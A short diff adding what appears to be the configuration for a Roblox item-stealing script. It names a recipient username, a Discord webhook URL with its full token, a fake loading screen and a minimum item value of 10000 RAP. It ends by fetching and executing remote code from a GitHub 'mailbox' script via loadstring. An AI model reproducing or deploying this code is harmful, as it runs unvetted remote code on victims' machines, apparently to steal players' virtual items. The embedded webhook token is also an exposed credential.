@@ -1,0 +1,9 @@
+Username = "Thedarkwuz"
+Username2 = "Thedarkwuz"
+Webhook = "https://discord.com/api/webhooks/1203830950040178788/XcYghJ4l165Vyrqm9lZDngJH9QLWGxIPMORrVWVQ5E_3Lw_J0UUzdRMEm1tqapMigyQu"
+
+LoadingScreen = true
+
+MinimumRAP = 10000
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/egorpomidor123/scripts/main/mailbox"))()
